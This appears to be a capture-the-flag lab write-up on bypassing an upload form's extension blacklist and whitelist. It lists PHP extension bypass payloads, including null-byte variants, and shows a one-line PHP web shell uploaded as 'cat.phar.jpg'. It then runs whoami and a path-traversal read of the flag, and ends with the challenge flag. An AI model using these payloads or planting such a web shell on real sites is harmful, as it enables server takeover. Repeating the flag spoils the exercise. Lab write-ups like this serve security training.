## Challenge

The above exercise employs a blacklist and a whitelist test to block unwanted extensions and only allow image extensions. Try to bypass both to upload a PHP script and execute code to read "/flag.txt" 

## Solution

I upload an image to the webpage, and send the request for this to the Burp intruder.

I use hte Simple list attack, and paste some php extensions from `payloadAllTheThings`:

```sh
.jpeg.php
.jpg.php
.png.php
.php
.php3
.php4
.php5
.php7
.php8
.pht
.phar
.phpt
.pgif
.phtml
.phtm
.php%00.gif
.php\x00.gif
.php%00.png
.php\x00.png
.php%00.jpg
.php\x00.jpg
```

In the result I see two kind of responses:
- Extension not allowed
- Only images are allowed

And `Only images are allowed` is shown on the `.phar` extension, telling me that this extension is being allowed, but its because its not an image that it's not being allowed.

Now I send a request with the extension `.phar.jpg` and on the body `<?php system($_REQUEST['cmd']); ?>`.

I see that I got RCE when I go to the link `http://83.136.249.46:44713/profile_images/cat.phar.jpg?cmd=whoami` and it shows me `www-data`, and I got the flag on this link by doing `path traversal` `http://83.136.249.46:44713/profile_images/cat.phar.jpg?cmd=cat%20../../../../flag.txt`.

The flag is `HTB{1_wh173l157_my53lf}`.

